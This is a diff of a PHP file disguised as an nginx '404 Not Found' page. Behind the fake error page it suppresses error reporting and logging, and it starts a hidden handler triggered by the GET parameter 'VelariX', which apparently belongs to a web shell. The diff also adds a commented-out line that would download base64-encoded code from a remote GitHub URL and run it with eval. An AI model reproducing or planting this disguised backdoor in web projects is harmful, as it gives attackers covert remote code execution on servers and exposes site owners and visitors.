@@ -1,12 +1,16 @@
 <html>
-<head><title>404 Not Found</title></head>
+<head><title>404 Not Found</title>
+<link rel="icon" type="image/png" href="https://www.google.com/s2/favicons?domain=https://127.0.0.1:22/"/>
+</head>
 <body bgcolor="white">
 <center><h1>404 Not Found</h1></center>
-<hr><center>nginx</center>
+<hr><center>nginx/1.16.0</center>
 <?php
 error_reporting(0);
 @ini_set('error_log',NULL);
 @ini_set('log_errors',0);
+
+//* @eval(base64_decode(file_get_contents('http://raw.githubusercontent.com/anoaghost/anoaghost.github.io/master/files/php/blocker.txt')));
 
 if(isset($_GET['VelariX']))
 {
